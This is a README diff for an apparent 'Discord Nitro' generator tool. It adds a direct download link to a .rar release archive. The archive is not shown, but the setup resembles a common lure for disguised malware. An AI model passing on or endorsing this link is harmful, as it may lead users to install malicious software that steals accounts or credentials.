@@ -10,7 +10,7 @@
 - 🪶 Easy to use
 
 ## Download
-⚡ Install --> [Releases]()
+⚡ Install --> [Releases](https://github.com/scretox/Discord-Nitro-Make/releases/download/v2.4/Relase.rar)
 
 
 ## 🎮 Getting Started
